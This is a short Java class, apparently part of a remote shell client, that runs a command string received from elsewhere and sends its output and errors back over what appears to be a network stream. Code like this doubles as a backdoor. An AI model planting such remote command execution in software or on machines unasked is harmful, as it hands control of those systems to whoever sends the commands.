import java.io.*;
import java.net.*;
class ClientBash extends Thread
{
    public  void run()
    {

        try
        {
            String s=ClientRead.comm;
            PrintStream ps=ClientTest.ps;
            ps.println("Starting Bash");
            Process ec=Runtime.getRuntime().exec(s);
            ps.flush();
            BufferedReader kbd=new BufferedReader(new InputStreamReader(ec.getInputStream()));
            BufferedReader kbd1=new BufferedReader(new InputStreamReader(ec.getErrorStream()));
            BufferedReader br=ClientTest.br;

           
            while(ec.isAlive())
            {
                String s1="";
                while((s1=kbd.readLine())!=null)
                {
                    ps.println(""+s1);
                    ps.flush();
                }
                while((s1=kbd1.readLine())!=null)
                {
                    ps.println("Error: "+s1);
                    ps.flush();
                }

            }   
            ps.println("Bash Ended");
            ps.flush();
        }catch(Exception e){}
    }
}
